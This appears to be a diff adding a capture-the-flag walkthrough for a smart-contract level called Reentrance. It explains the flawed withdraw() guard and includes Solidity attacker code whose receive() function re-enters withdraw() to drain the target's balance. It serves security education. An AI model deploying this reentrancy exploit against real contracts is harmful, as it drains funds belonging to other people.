@@ -560,7 +560,76 @@ contract KingAttacker {
 }
 ```
 
-
 ### References
 
 * https://docs.soliditylang.org/en/v0.8.18/contracts.html#receive-ether-function
+
+## 10 Reenstrance
+
+To beat this level, we need to comply with
+
+```solidity
+address(instance).balance == 0
+```
+
+### Solution
+
+Look at the guard of the `withdraw()` function
+
+```solidity
+function withdraw(uint _amount) public {
+  if(balances[msg.sender] >= _amount) {
+    (bool result,) = msg.sender.call{value:_amount}("");
+    if(result) {
+      _amount;
+    }
+    balances[msg.sender] -= _amount;
+  }
+}
+```
+
+The guard will let us pass if `balances[msg.sender] >= _amount`, and then the function will call `msg.sender`, giving it the `amount` requested, balance will be updated.
+
+In a reentrancy attack, we craft a `receive()` function such that we call the very `withdraw()` function again. That is
+
+```
+msg.sender
+  -> Reentrance.withdraw()
+    -> receive()
+      -> Reentrance.withdraw()
+        -> receive()
+          -> (and so on)
+```
+
+This flow will keep working, as the guard `balances[msg.sender] >= _amount` is `true`, draining the smart contract in the process.
+
+An example on how the attack could be written is
+
+```solidity
+function attack() external {
+  // first donate something to be able to pass the guard,
+  // that is balances[msg.sender] >= _amount
+  target.donate{value: 0.001 ether}(address(this));
+
+  // then trigger the withdraw function
+  // the latter will call receive() below.
+  target.withdraw(0.001 ether);
+}
+
+receive() external payable {
+  uint targetBalance = address(target).balance;
+
+  // this can be a clean way to drain the contract.
+  // you can also just set target.withdraw() and
+  // re-enter until it reverts.
+  if (targetBalance >= 0.001 ether) {
+    target.withdraw(0.001 ether);
+  }
+}
+```
+
+### References
+
+* https://solidity-by-example.org/hacks/re-entrancy/
+* https://hackernoon.com/hack-solidity-reentrancy-attack
+* https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-02-reentrancy-b0c08cfcd555
